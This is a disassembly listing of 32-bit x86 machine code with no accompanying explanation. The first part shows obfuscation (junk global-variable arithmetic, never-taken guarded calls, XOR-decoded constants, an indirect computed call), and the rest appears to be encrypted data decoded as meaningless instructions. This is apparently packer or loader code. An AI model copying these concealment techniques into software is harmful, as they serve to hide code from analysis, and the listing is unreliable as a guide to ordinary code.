  41604b:	dec    esp
  41604c:	adc    eax,0x17eeda9
  416051:	inc    esi
  416052:	sub    dl,BYTE PTR [edi-0x69058398]
  416058:	lea    ebx,[edi+0x16]
  41605b:	int3   
  41605c:	sti    
  41605d:	pop    ebp
  41605e:	out    0xf0,al
  416060:	cwde   
  416061:	loop   0x41606c
  416063:	jmp    0x41602d
  416065:	inc    edi
  416066:	lods   eax,DWORD PTR ds:[esi]
  416067:	test   al,0xe4
  416069:	mov    ecx,DWORD PTR [ebp+0x8]
  41606c:	xor    eax,esi
  41606e:	lea    eax,[eax+ecx*1+0x3272ec]
  416075:	mov    DWORD PTR [ebp+0x8],eax
  416078:	mov    eax,DWORD PTR [ebp-0xc]
  41607b:	mov    ecx,DWORD PTR [ebp+0x14]
  41607e:	xor    eax,esi
  416080:	add    eax,edi
  416082:	imul   eax,DWORD PTR [ecx]
  416085:	mov    ecx,DWORD PTR [ebp-0x4]
  416088:	mov    edx,DWORD PTR [ebp+0x8]
  41608b:	xor    ecx,esi
  41608d:	lea    ecx,[ecx+edx*1+0x3272ec]
  416094:	cmp    ecx,eax
  416096:	jne    0x413ca6
  41609c:	mov    eax,DWORD PTR [ebp-0x4]
  41609f:	xor    eax,esi
  4160a1:	add    eax,edi
  4160a3:	mov    DWORD PTR [ebp-0x10],eax
  4160a6:	mov    ebx,0x65655
  4160ab:	add    ebx,0x3234
  4160b1:	xchg   ebx,esi
  4160b3:	xor    ebx,ebx
  4160b5:	push   esi
  4160b6:	mov    esi,ebx
  4160b8:	pop    ebx
  4160b9:	mov    edx,esi
  4160bb:	add    ebx,0x1002
  4160c1:	lea    eax,[ebp-0x18]
  4160c4:	add    edx,eax
  4160c6:	add    edx,0x5
  4160c9:	push   edx
  4160ca:	inc    esi
  4160cb:	pop    ecx
  4160cc:	dec    ecx
  4160cd:	xchg   ecx,eax
  4160ce:	dec    eax
  4160cf:	xchg   ecx,eax
  4160d0:	dec    ecx
  4160d1:	xchg   ecx,edx
  4160d3:	dec    edx
  4160d4:	push   edx
  4160d5:	mov    edx,ebx
  4160d7:	pop    ebx
  4160d8:	dec    ebx
  4160d9:	call   DWORD PTR [ebx]
  4160db:	cmp    DWORD PTR [ebp+0x10],esi
  4160de:	je     0x4160fd
  4160e4:	xchg   edx,eax
  4160e5:	push   0xb
  4160e7:	pop    ecx
  4160e8:	push   0x4
  4160ea:	pop    ebx
  4160eb:	inc    ebx
  4160ec:	xchg   ebx,ecx
  4160ee:	sub    ebx,ecx
  4160f0:	xchg   ebx,ecx
  4160f2:	dec    ecx
  4160f3:	dec    ecx
  4160f4:	mov    eax,DWORD PTR [ebp-0x1c]
  4160f7:	imul   eax,ecx
  4160fa:	add    esp,eax
  4160fc:	xchg   edx,eax
  4160fd:	push   eax
  4160fe:	xor    ebx,ebx
  416100:	mov    edx,esp
  416102:	dec    edx
  416103:	inc    ebx
  416104:	add    ebx,DWORD PTR [edx+ebx*1]
  416107:	dec    ebx
  416108:	xor    edx,edx
  41610a:	add    DWORD PTR [ebp-0x10],ebx
  41610d:	pop    ebx
  41610e:	mov    eax,DWORD PTR [ebp-0x10]
  416111:	pop    edi
  416112:	pop    esi
  416113:	pop    ebx
  416114:	leave  
  416115:	ret    0x10
  416118:	push   ebp
  416119:	mov    ebp,esp
  41611b:	push   ecx
  41611c:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  416123:	and    eax,0x6d5c
  416128:	mov    eax,DWORD PTR [ebp-0x4]
  41612b:	or     DWORD PTR ds:0x42d00c,edx
  416131:	mov    edx,DWORD PTR [ebp+0x10]
  416134:	dec    ecx
  416135:	mov    ecx,0x75108a4
  41613a:	xor    eax,ecx
  41613c:	add    eax,0x3272ec
  416141:	adc    DWORD PTR ds:0x42b00c,0x375
  41614b:	mov    DWORD PTR [edx],eax
  41614d:	sub    DWORD PTR ds:0x42b008,ecx
  416153:	mov    eax,DWORD PTR [ebp+0xc]
  416156:	and    DWORD PTR ds:0x42b014,0x0
  416160:	xor    edx,edx
  416162:	add    edx,DWORD PTR ds:0x42b014
  416168:	inc    edx
  416169:	mov    DWORD PTR ds:0x42b014,edx
  41616f:	cmp    DWORD PTR ds:0x42b014,0xf
  416176:	ja     0x4161cd
  41617c:	jmp    0x4161a6
  416181:	push   DWORD PTR [ebp-0x28]
  416184:	push   DWORD PTR [ebp-0x18]
  416187:	push   0x42b00c
  41618c:	push   0x1f1a
  416191:	push   0x8ba1
  416196:	push   0x2c78
  41619b:	push   0x5355
  4161a0:	call   DWORD PTR ds:0x43001b
  4161a6:	cmp    DWORD PTR ds:0x42b014,0xe
  4161ad:	jne    0x4161c0
  4161b3:	mov    edx,DWORD PTR ds:0x42b014
  4161b9:	inc    edx
  4161ba:	mov    DWORD PTR ds:0x42b014,edx
  4161c0:	cmp    DWORD PTR ds:0x42b014,0x1f
  4161c7:	jb     0x416160
  4161cd:	xor    eax,ecx
  4161cf:	push   esi
  4161d0:	mov    esi,DWORD PTR [ebp+0x10]
  4161d3:	mov    edx,0x3272ec
  4161d8:	add    eax,edx
  4161da:	mov    DWORD PTR [esi+0x4],eax
  4161dd:	mov    eax,DWORD PTR [ebp+0x14]
  4161e0:	mov    esi,DWORD PTR [ebp+0x10]
  4161e3:	mov    DWORD PTR [esi+0x8],eax
  4161e6:	mov    eax,DWORD PTR [ebp+0x18]
  4161e9:	mov    esi,DWORD PTR [ebp+0x10]
  4161ec:	mov    DWORD PTR [esi+0xc],eax
  4161ef:	mov    eax,DWORD PTR [ebp+0x1c]
  4161f2:	mov    esi,DWORD PTR [ebp+0x10]
  4161f5:	mov    DWORD PTR [esi+0x10],eax
  4161f8:	mov    eax,DWORD PTR [ebp+0x8]
  4161fb:	xor    eax,ecx
  4161fd:	add    eax,edx
  4161ff:	pop    esi
  416200:	leave  
  416201:	ret    0x18
  416204:	push   ebp
  416205:	mov    ebp,esp
  416207:	sub    esp,0x9c
  41620d:	movzx  eax,BYTE PTR ds:0x429024
  416214:	sbb    eax,DWORD PTR ds:0x429000
  41621a:	mov    ds:0x429024,eax
  41621f:	mov    ecx,DWORD PTR [ebp+0x8]
  416222:	mov    eax,0x8a94
  416227:	xor    ax,WORD PTR [ecx+0x20]
  41622b:	mov    ecx,0x3b56
  416230:	xor    DWORD PTR ds:0x429008,0x611c
  41623a:	add    ax,cx
  41623d:	movzx  eax,ax
  416240:	mov    DWORD PTR [ebp-0x10],eax
  416243:	and    DWORD PTR ds:0x429014,0xd29
  41624d:	mov    BYTE PTR [ebp-0x1],0x7d
  416251:	adc    ecx,DWORD PTR ds:0x42d004
  416257:	lea    eax,[ebp-0x1]
  41625a:	mov    DWORD PTR ds:0x42b00c,0x12
  416264:	cmp    DWORD PTR ds:0x42b00c,0x0
  41626b:	je     0x4162a3
  416271:	cmp    DWORD PTR ds:0x42b00c,0x17
  416278:	jbe    0x4162a3
  41627e:	jmp    0x416291
  416283:	push   DWORD PTR [ebp-0x28]
  416286:	push   0x84ea
  41628b:	call   DWORD PTR ds:0x430027
  416291:	mov    ecx,DWORD PTR ds:0x42b00c
  416297:	dec    ecx
  416298:	mov    DWORD PTR ds:0x42b00c,ecx
  41629e:	jmp    0x416264
  4162a3:	mov    DWORD PTR [ebp-0xc],eax
  4162a6:	mov    al,BYTE PTR [ebp-0x1]
  4162a9:	sub    DWORD PTR ds:0x42a010,0x238f
  4162b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4162b6:	xor    DWORD PTR ds:0x42a01c,0x42b01c
  4162c0:	xor    al,0x79
  4162c2:	add    DWORD PTR ds:0x42c01c,0x429014
  4162cc:	sub    al,0x3
  4162ce:	add    DWORD PTR ds:0x42c01c,0x2d5e
  4162d8:	mov    BYTE PTR [ecx],al
  4162da:	and    DWORD PTR ds:0x429004,0x0
  4162e4:	xor    eax,eax
  4162e6:	xor    eax,DWORD PTR ds:0x429004
  4162ec:	inc    eax
  4162ed:	mov    ds:0x429004,eax
  4162f2:	cmp    DWORD PTR ds:0x429004,0x6
  4162f9:	jge    0x41633a
  4162ff:	jmp    0x416312
  416304:	push   DWORD PTR [ebp-0x10]
  416307:	push   0x8717
  41630c:	call   DWORD PTR ds:0x43002b
  416312:	cmp    DWORD PTR ds:0x429004,0x5
  416319:	jne    0x41632d
  41631f:	xor    eax,eax
  416321:	xor    eax,DWORD PTR ds:0x429004
  416327:	inc    eax
  416328:	mov    ds:0x429004,eax
  41632d:	cmp    DWORD PTR ds:0x429004,0x11
  416334:	jb     0x4162e4
  41633a:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  416341:	and    DWORD PTR ds:0x42d014,0x6f44
  41634b:	push   ebx
  41634c:	not    DWORD PTR ds:0x42a010
  416352:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  416359:	mov    ecx,DWORD PTR [ebp-0x18]
  41635c:	add    DWORD PTR ds:0x429010,0x796f
  416366:	push   esi
  416367:	mov    DWORD PTR ds:0x42a004,0x19
  416371:	cmp    DWORD PTR ds:0x42a004,0x0
  416378:	je     0x4163b7
  41637e:	cmp    DWORD PTR ds:0x42a004,0x28
  416385:	jl     0x4163b7
  41638b:	jmp    0x4163a5
  416390:	push   0x5678
  416395:	push   0x429018
  41639a:	push   0x42f025
  41639f:	call   DWORD PTR ds:0x430033
  4163a5:	mov    esi,DWORD PTR ds:0x42a004
  4163ab:	dec    esi
  4163ac:	mov    DWORD PTR ds:0x42a004,esi
  4163b2:	jmp    0x416371
  4163b7:	mov    eax,0x75108a4
  4163bc:	and    DWORD PTR ds:0x42b01c,0x6a8d
  4163c6:	xor    ecx,eax
  4163c8:	mov    esi,DWORD PTR ds:0x42b000
  4163ce:	xor    DWORD PTR ds:0x42a010,esi
  4163d4:	mov    esi,0x3272ec
  4163d9:	sbb    DWORD PTR ds:0x42a000,0x4a3d
  4163e3:	push   edi
  4163e4:	add    ecx,esi
  4163e6:	mov    DWORD PTR ds:0x42a018,0x89b
  4163f0:	jmp    0x41641e
  4163f5:	mov    DWORD PTR ds:0x42c010,0x3697
  4163ff:	mov    dl,BYTE PTR [ebp-0x1]
  416402:	mov    DWORD PTR ds:0x42d004,0x1aee
  41640c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  416413:	mov    DWORD PTR ds:0x42b014,0x1f71
  41641d:	inc    ecx
  41641e:	cmp    ecx,0x40
  416421:	mov    DWORD PTR ds:0x429024,0xce6
  41642b:	jb     0x4163f5
  416431:	mov    edx,DWORD PTR [ebp-0x18]
  416434:	xor    edx,eax
  416436:	add    edx,esi
  416438:	jmp    0x4164b8
  41643d:	sub    ecx,edi
  41643f:	mov    edi,DWORD PTR [ebp+0x8]
  416442:	mov    ecx,DWORD PTR ds:0x42c018
  416448:	or     DWORD PTR ds:0x42d010,ecx
  41644e:	mov    ecx,0x8a94
  416453:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416458:	mov    edi,0x3b56
  41645d:	add    DWORD PTR ds:0x42d00c,0x618e
  416467:	add    cx,di
  41646a:	adc    DWORD PTR ds:0x42a000,0x96b
  416474:	movzx  ecx,cx
  416477:	mov    DWORD PTR ds:0x42b004,0x7547
  416481:	mov    DWORD PTR [ebp-0xc],ecx
  416484:	mov    ecx,DWORD PTR [ebp+0x8]
  416487:	movzx  ecx,WORD PTR [ecx+edx*4]
  41648b:	add    DWORD PTR ds:0x42a00c,0x429020
  416495:	xor    ecx,0x8a94
  41649b:	adc    DWORD PTR ds:0x42a01c,0x473e
  4164a5:	add    ecx,edi
  4164a7:	mov    edi,0x26b3
  4164ac:	mov    edi,DWORD PTR [ebp-0xc]
  4164af:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  4164b6:	inc    ecx
  4164b7:	inc    edx
  4164b8:	mov    ecx,DWORD PTR [ebp-0x10]
  4164bb:	cmp    edx,ecx
  4164bd:	jmp    0x418820
  4164c2:	shl    al,cl
  4164c4:	inc    edi
  4164c5:	dec    ecx
  4164c6:	cmp    edi,DWORD PTR [ecx+0x7fc9f3b8]
  4164cc:	push   cs
  4164cd:	mov    eax,0x230e20df
  4164d2:	pop    ebx
  4164d3:	cmp    BYTE PTR [ebp+0x7a],bh
  4164d6:	xor    BYTE PTR [edi+0x7a],bl
  4164d9:	jp     0x416464
  4164db:	dec    esp
  4164dc:	xor    BYTE PTR [edx],ah
  4164de:	xchg   dl,cl
  4164e0:	repz in eax,dx
  4164e2:	in     eax,dx
  4164e3:	out    dx,eax
  4164e4:	nop
  4164e5:	test   DWORD PTR [eax+0x14],0x6cc3aa0b
  4164ec:	cmp    al,0x26
  4164ee:	fs xchg cl,ah
  4164f1:	cwde   
  4164f2:	pop    ebx
  4164f3:	sbb    edi,DWORD PTR [ecx+0x50]
  4164f6:	ds gs and eax,0x247d723f
  4164fd:	fist   WORD PTR [edx]
  4164ff:	jnp    0x41656e
  416501:	or     eax,0x4b5ef683
  416506:	hlt    
  416507:	push   ds
  416508:	mov    eax,0xa206a9b6
  41650d:	fldcw  WORD PTR [eax-0x6064f211]
  416513:	add    eax,0x129db240
  416518:	xor    eax,0xdfb39e6e
  41651d:	push   esp
  41651e:	imul   edi,DWORD PTR [ecx],0x6fd8a01c
  416524:	add    al,0xfc
  416526:	add    al,0xf2
  416528:	cld    
  416529:	jmp    0x6188:0x8ac0c24b
  416530:	mov    ?,WORD PTR [ecx]
  416532:	cmp    DWORD PTR [ebx+0x16],ebp
  416535:	and    eax,0x82044a7b
  41653a:	in     al,dx
  41653b:	mov    eax,0xa39f6be9
  416540:	jge    0x4164c3
  416542:	fstp   QWORD PTR gs:[eax+0x7914cbc6]
  416549:	ss test ecx,esi
  41654c:	cmp    BYTE PTR [ecx],0x2b
  41654f:	inc    esp
  416550:	cli    
  416551:	add    BYTE PTR [esi-0x62cb9689],bl
  416557:	mov    ebx,ecx
  416559:	scas   al,BYTE PTR es:[edi]
  41655a:	push   ecx
  41655b:	jle    0x416502
  41655d:	fcom   DWORD PTR [edi-0x3f]
  416560:	cmp    al,0x6d
  416562:	jae    0x4165b2
  416564:	cmp    ch,ah
  416566:	mov    ecx,ebx
  416568:	and    ah,0xf2
  41656b:	ret    0xd84d
  41656e:	into   
  41656f:	fnstcw WORD PTR [ecx]
  416571:	jo     0x4165b8
  416573:	icebp  
  416574:	or     eax,0xf5b505f0
  416579:	fsubp  st(7),st
  41657b:	fs in  eax,dx
  41657d:	jae    0x41650b
  41657f:	shl    esi,0x69
  416582:	(bad)  
  416584:	jmp    0xef653744
  416589:	sbb    eax,0x31ad6448
  41658e:	adc    eax,0x88601e61
  416593:	mov    ebx,0x8f3b466c
  416598:	dec    ecx
  416599:	push   eax
  41659a:	in     eax,0x5d
  41659c:	push   ss
  41659d:	loop   0x4165a1
  41659f:	sub    BYTE PTR [esi-0x1ecaaa40],ch
  4165a5:	mov    DWORD PTR [ecx+0x5f80958],ebp
  4165ab:	and    DWORD PTR [eax-0x19c24470],ebp
  4165b1:	xor    al,0x1d
  4165b3:	adc    ch,BYTE PTR [edx+ebx*8]
  4165b6:	push   ss
  4165b7:	jl     0x416626
  4165b9:	pop    esp
  4165ba:	and    ebp,eax
  4165bc:	or     eax,0x7bda4a4c
  4165c1:	push   eax
  4165c2:	pop    edx
  4165c3:	(bad)  
  4165c4:	(bad)  
  4165c5:	dec    edx
  4165c6:	adc    edx,esi
  4165c8:	dec    edx
  4165c9:	and    al,0xf3
  4165cb:	fild   WORD PTR [edi+0x6c]
  4165ce:	pop    esi
  4165cf:	xlat   BYTE PTR ds:[ebx]
  4165d0:	js     0x41661d
  4165d2:	mov    ds:0x6eb6d829,al
  4165d7:	repz mov ds:0x7d9d7200,eax
  4165dd:	nop
  4165de:	pop    ss
  4165df:	add    bl,BYTE PTR [ebx+0xde48569]
  4165e5:	dec    esp
  4165e6:	jne    0x4165f5
  4165e8:	xor    BYTE PTR ss:[eax],al
  4165eb:	and    eax,0x289ba653
  4165f0:	xchg   edi,eax
  4165f1:	shl    DWORD PTR [edi-0x55],1
  4165f4:	pusha  
  4165f5:	add    BYTE PTR [eax],cl
  4165f7:	ret    0x3ef6
  4165fa:	aaa    
  4165fb:	sbb    BYTE PTR [edi+0x39],ah
  4165fe:	cmp    al,0x75
  416600:	mov    edx,0x101c2c32
  416605:	cmp    dl,BYTE PTR [esi+0x1d]
  416608:	mov    dl,0xf9
  41660a:	outs   dx,DWORD PTR ds:[esi]
  41660b:	xor    ebp,DWORD PTR [edx]
  41660d:	mov    DWORD PTR [ecx+esi*4],ebx
  416610:	cmp    eax,0xe7857104
  416615:	pop    edi
  416616:	retf   
  416617:	push   esi
  416618:	add    eax,DWORD PTR [eax-0x257bfe3e]
  41661e:	popf   
  41661f:	lods   al,BYTE PTR ds:[esi]
  416620:	and    ch,BYTE PTR [esp+edx*4-0x5a39a9bd]
  416627:	or     bl,dl
  416629:	mov    ebx,DWORD PTR [eax-0x39]
  41662c:	jg     0x4165c9
  41662e:	lea    ecx,[ebx]
  416630:	addr16 push ebp
  416632:	test   al,0xa5
  416634:	loop   0x4165d8
  416636:	ja     0x416670
  416638:	pop    edx
  416639:	push   ebx
  41663a:	addr16 pop esp
  41663c:	sar    BYTE PTR [edx-0x6cf4f5df],cl
  416642:	cwde   
  416643:	mov    al,0x96
  416645:	adc    DWORD PTR [edx+0x73],esp
  416648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41664a:	adc    esp,DWORD PTR [ebp+0x4d7a2789]
  416650:	inc    ebx
  416651:	xor    BYTE PTR [edx],dh
  416653:	mov    al,ds:0x5292ad09
  416658:	inc    esi
  416659:	ret    
  41665a:	ins    DWORD PTR es:[edi],dx
  41665b:	or     eax,0x8c7675bb
  416660:	add    BYTE PTR [ebx+0x43abdc8b],0xe5
  416667:	push   edi
  416668:	int    0x9e
  41666a:	adc    eax,0x92ba0b5f
  41666f:	sbb    edx,esi
  416671:	dec    edi
  416672:	test   al,0x54
  416674:	jns    0x4166b3
  416676:	sar    BYTE PTR [ebp-0x79d5176e],1
  41667c:	rol    DWORD PTR [edi+0x64],1
  41667f:	inc    ebp
  416680:	int3   
  416681:	add    esi,DWORD PTR [ecx]
  416683:	jae    0x41665a
  416685:	fstp   TBYTE PTR [edx-0x58f8485e]
  41668b:	cmc    
  41668c:	popa   
  41668d:	dec    edi
  41668e:	fisttp WORD PTR [ebp+edi*4+0x79]
  416692:	loope  0x416644
  416694:	aad    0xb3
  416696:	(bad)
  416699:	cmc    
  41669a:	repnz fcom DWORD PTR [ebp+edi*2-0x65906095]
  4166a2:	out    dx,al
  4166a3:	or     BYTE PTR [edi+0x6ee68883],al
  4166a9:	mov    BYTE PTR [ebx+0x52],ch
  4166ac:	sub    BYTE PTR [edx],dh
  4166ae:	ja     0x4166f8
  4166b0:	sbb    esp,edx
  4166b2:	fnstcw WORD PTR ds:0x8b4a9f5f
  4166b8:	retf   
  4166b9:	cdq    
  4166ba:	pop    eax
  4166bb:	iret   
  4166bc:	sub    al,0x4f
  4166be:	sbb    dh,ch
  4166c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c1:	or     eax,0xb4b6ab33
  4166c6:	inc    ebx
  4166c7:	xchg   ecx,esp
  4166c9:	pushf  
  4166ca:	lock and BYTE PTR [edi+0x4354b1ba],ch
  4166d1:	ss dec esp
  4166d3:	in     al,0x38
  4166d5:	jle    0x41669d
  4166d7:	mov    edi,0xde1c6df8
  4166dc:	mov    ds:0x9a57c885,al
  4166e1:	and    ebp,DWORD PTR [edi-0x5b08bf38]
  4166e7:	mov    cl,bh
  4166e9:	dec    edi
  4166ea:	(bad)
  4166ed:	dec    eax
  4166ee:	mov    bh,0x69
  4166f0:	popa   
  4166f1:	(bad)  
  4166f2:	fucom  st(5)
  4166f4:	int    0x51
  4166f6:	sub    DWORD PTR [ebx+0x52],ebp
  4166f9:	retf   0x4147
  4166fc:	mov    ds:0xb6162923,eax
  416701:	sahf   
  416702:	cmc    
  416703:	inc    ebp
  416704:	xchg   ecx,eax
  416705:	dec    esp
  416706:	jle    0x41671f
  416708:	push   es
  416709:	jnp    0x4166db
  41670b:	int    0x4b
  41670d:	cld    
  41670e:	mov    eax,0xa7304ef3
  416713:	xlat   BYTE PTR ds:[ebx]
  416714:	iret   
  416715:	icebp  
  416716:	cmc    
  416717:	mov    ebx,DWORD PTR [eax+0x7f]
  41671a:	imul   ebx,DWORD PTR [ebp-0x60],0xf4cf08e4
  416721:	mov    ecx,gs
  416723:	jnp    0x4166d9
  416725:	inc    edi
  416726:	in     eax,dx
  416727:	aaa    
  416728:	dec    eax
  416729:	dec    ebx
  41672a:	bound  ecx,QWORD PTR [ebx+0x21]
  41672d:	push   edi
  41672e:	xor    DWORD PTR [edi+ebx*4+0x17],edx
  416732:	inc    edx
  416733:	pop    ebp
  416734:	jl     0x4166f9
  416736:	fld    TBYTE PTR [edx+0x48]
  416739:	rcr    ebp,1
  41673b:	mov    eax,edi
  41673d:	(bad)  
  41673e:	mov    ebp,0x43405863
  416743:	push   0x52e60298
  416748:	mov    BYTE PTR [eax],dh
  41674a:	sahf   
  41674b:	push   ds
  41674c:	nop
  41674d:	mov    ebp,edx
  41674f:	jl     0x4166d4
  416751:	je     0x41678f
  416753:	cmp    ecx,DWORD PTR [esi+0x7]
  416756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416757:	and    BYTE PTR [edi],dl
  416759:	xchg   esi,eax
  41675a:	scas   eax,DWORD PTR es:[edi]
  41675b:	cld    
  41675c:	xor    eax,0x3b896dd
  416761:	stos   DWORD PTR es:[edi],eax
  416762:	lods   al,BYTE PTR ds:[esi]
  416763:	inc    ecx
  416764:	adc    al,0x4b
  416766:	dec    esp
  416767:	push   0xffffffd7
  416769:	or     al,0x29
  41676b:	xchg   esp,eax
  41676c:	clc    
  41676d:	imul   esi,ebp,0x6ee0cdb4
  416773:	mov    ebp,0x66e36851
  416778:	xchg   ebx,eax
  416779:	mov    ds:0x9cf5e6e,eax
  41677e:	out    0x49,al
  416780:	nop
  416781:	xchg   ebp,eax
  416782:	lods   eax,DWORD PTR ds:[esi]
  416783:	jmp    DWORD PTR [esi-0x4f]
  416786:	loope  0x416718
  416788:	jmp    0x416740
  41678a:	jb     0x41680a
  41678c:	ins    BYTE PTR es:[edi],dx
  41678d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41678e:	sbb    eax,0x7a8317b6
  416793:	lods   eax,DWORD PTR ds:[esi]
  416794:	call   0x5b90:0x849012e6
  41679b:	lahf   
  41679c:	rcr    DWORD PTR [ebp-0x4],cl
  41679f:	jle    0x41672f
  4167a1:	test   eax,0x492a637d
  4167a6:	jne    0x41673d
  4167a8:	cmp    eax,0x26c689c
  4167ad:	jmp    0x6d92:0xb75c70a7
  4167b4:	or     al,0x7b
  4167b6:	mov    ecx,0x1225b4c4
  4167bb:	inc    ebx
  4167bc:	xchg   esi,ecx
  4167be:	inc    ecx
  4167bf:	cmp    esi,DWORD PTR [esi+0x475c682f]
  4167c5:	fmul   DWORD PTR [ecx-0x66]
  4167c8:	inc    eax
  4167c9:	in     al,dx
  4167ca:	pop    ebx
  4167cb:	pop    ss
  4167cc:	(bad)  
  4167cd:	sbb    al,0xf8
  4167cf:	sub    dl,bl
  4167d1:	imul   ecx,DWORD PTR [esi-0x36a47e27],0x6a7d13c8
  4167db:	dec    BYTE PTR [ebp+0x57]
  4167de:	les    ebp,FWORD PTR [edx+0x3f]
  4167e1:	icebp  
  4167e2:	mov    esp,edx
  4167e4:	nop
  4167e5:	ficom  WORD PTR ds:0xcd883ec7
  4167eb:	in     eax,0xcf
  4167ed:	xchg   DWORD PTR [edi-0xb7adaa9],ebx
  4167f3:	adc    BYTE PTR ss:[edi+0xa],dh
  4167f7:	scas   eax,DWORD PTR es:[edi]
  4167f8:	sbb    BYTE PTR [ebp+0x1e],dl
  4167fb:	dec    esp
  4167fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167fd:	jns    0x416788
  4167ff:	cli    
  416800:	je     0x41681a
  416802:	sub    bp,WORD PTR [ecx-0x16abf5e]
  416809:	(bad)  
  41680a:	lock scas al,BYTE PTR es:[edi]
  41680c:	leave  
  41680d:	imul   edx,ecx,0xac94270b
  416813:	cs js  0x416840
  416816:	add    edx,DWORD PTR ds:0x72801a3e
  41681c:	loop   0x416837
  41681e:	aam    0x93
  416820:	ret    0xb4b7
  416823:	inc    eax
  416824:	retf   
  416825:	add    al,BYTE PTR [esi]
  416827:	in     eax,0x96
  416829:	inc    ebp
  41682a:	and    edx,ecx
  41682c:	or     DWORD PTR [eax],eax
  41682e:	ror    dh,0xff
  416831:	rcl    eax,cl
  416833:	imul   esp,DWORD PTR [ebx-0x1b11a110],0xd5d3f324
  41683d:	fisttp QWORD PTR [ebx+0x8ae8ca3]
  416843:	push   es
  416844:	pop    ss
  416845:	loop   0x416811
  416847:	jp     0x41689b
  416849:	sub    cl,al
  41684b:	add    eax,0xce219c85
  416850:	inc    eax
  416851:	ror    DWORD PTR [edi+0x2c],0xb3
  416855:	rcl    BYTE PTR [esi+0x4c],1
  416858:	mov    bl,BYTE PTR [edi]
  41685a:	cwde   
  41685b:	push   edi
  41685c:	xor    dh,ch
  41685e:	push   ebp
  41685f:	dec    eax
  416860:	fcomi  st,st(1)
  416862:	mov    esi,0x4c42e360
  416867:	add    DWORD PTR [edx],ecx
  416869:	sti    
  41686a:	ror    DWORD PTR [edi-0x264e8208],cl
  416870:	mov    ebx,0xa0cfc941
  416875:	lea    edx,[edi]
  416877:	enter  0x5650,0xe3
  41687b:	push   ebx
  41687c:	js     0x41684e
  41687e:	rcl    BYTE PTR [ebx],1
  416880:	lods   eax,DWORD PTR ds:[esi]
  416881:	adc    edi,DWORD PTR [eax+ecx*8+0x4aa67551]
  416888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416889:	mov    ebp,0x363d130e
  41688e:	pop    es
  41688f:	popf   
  416890:	shr    BYTE PTR [bp-0x3010],cl
  416895:	pop    sp
  416897:	fisubr WORD PTR [eax+0x4403a25d]
  41689d:	inc    esp
  41689e:	xor    dl,BYTE PTR [ebx]
  4168a0:	sbb    cl,BYTE PTR [esi]
  4168a2:	mov    al,ds:0xc5624a02
  4168a7:	or     cl,BYTE PTR [edi]
  4168a9:	mov    ds:0x27524d72,al
  4168ae:	pop    esp
  4168af:	into   
  4168b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b1:	idiv   BYTE PTR [ebx]
  4168b3:	and    esi,edx
  4168b5:	pop    ecx
  4168b6:	shl    dh,0x8a
  4168b9:	lds    esi,FWORD PTR [esi-0x53]
  4168bc:	test   DWORD PTR [ebp*8+0x2830a9c7],ebx
  4168c3:	shl    DWORD PTR [esi+0x427e37a3],0xc7
  4168ca:	popa   
  4168cb:	int3   
  4168cc:	mov    edx,DWORD PTR [esi]
  4168ce:	lea    ebx,[ecx+edx*2-0x6b]
  4168d2:	shl    edx,cl
  4168d4:	or     al,0xc
  4168d6:	push   ecx
  4168d7:	sub    DWORD PTR [edi-0x7b],edi
  4168da:	mov    dl,0xf4
  4168dc:	sub    eax,0xc1cd289e
  4168e1:	mov    cl,0x83
  4168e3:	inc    ebp
  4168e4:	xchg   DWORD PTR [ecx-0x103bd1a6],eax
  4168ea:	sbb    BYTE PTR [eax],cl
  4168ec:	cmp    BYTE PTR [esi+0x3a],ch
  4168ef:	pop    eax
  4168f0:	mov    al,ds:0x7776bbeb
  4168f5:	push   ss
  4168f6:	dec    eax
  4168f7:	sti    
  4168f8:	sbb    ebx,ebp
  4168fa:	xor    dh,dl
  4168fc:	push   ebp
  4168fd:	xchg   dl,ch
  4168ff:	lea    ebp,[edi+0x26]
  416902:	mov    ds:0xbd029afb,ax
  416908:	and    bl,al
  41690a:	or     DWORD PTR [ecx+edx*1],ebp
  41690d:	addr16 and al,bh
  416910:	mov    dl,0xf9
  416912:	add    eax,0x65acca86
  416917:	popf   
  416918:	int3   
  416919:	push   0xffffff9d
  41691b:	jnp    0x4168cd
  41691d:	lods   al,BYTE PTR ds:[esi]
  41691e:	call   0x20b817c5
  416923:	div    ch
  416925:	dec    edi
  416926:	sbb    DWORD PTR [eax-0x3d],ebx
  416929:	jae    0x41693c
  41692b:	mov    esp,0x6d71eba3
  416930:	add    BYTE PTR cs:[edx],bl
  416933:	dec    eax
  416934:	jmp    0x4bc5ab63
  416939:	xor    eax,0xe430338a
  41693e:	fmul   DWORD PTR [ecx+ebx*8-0x587a3c63]
  416945:	icebp  
  416946:	ds inc edx
  416948:	cmp    BYTE PTR [ebx+0xc],0x16
  41694c:	push   es
  41694d:	imul   eax,edi,0x82a61ed9
  416953:	xchg   DWORD PTR [esi-0x34],edx
  416956:	mov    ch,0xf4
  416958:	in     eax,0xf7
  41695a:	cmp    al,0x58
  41695c:	lahf   
  41695d:	ficom  DWORD PTR [ebx]
  41695f:	test   eax,0x46d35d2
  416964:	lds    eax,FWORD PTR [eax]
  416966:	test   DWORD PTR [ecx-0x64e012e9],eax
  41696c:	mov    ch,0x62
  41696e:	test   BYTE PTR [eax+0x58],0x2
  416972:	cmp    eax,0xec52da47
  416977:	mov    esp,0x8d13d8f5
  41697c:	jg     0x416957
  41697e:	xor    ah,BYTE PTR [eax]
  416980:	add    DWORD PTR [eax+0x7a0d8bf6],0x8db37cf5
  41698a:	call   0xf544ea58
  41698f:	gs call 0x4eaae2c9
  416995:	fcomp  QWORD PTR [esi+0x10ba9fbc]
  41699b:	lock js 0x416948
  41699e:	xor    al,BYTE PTR [ebx-0x34ac748b]
  4169a4:	push   ebp
  4169a5:	jge    0x41699a
  4169a7:	into   
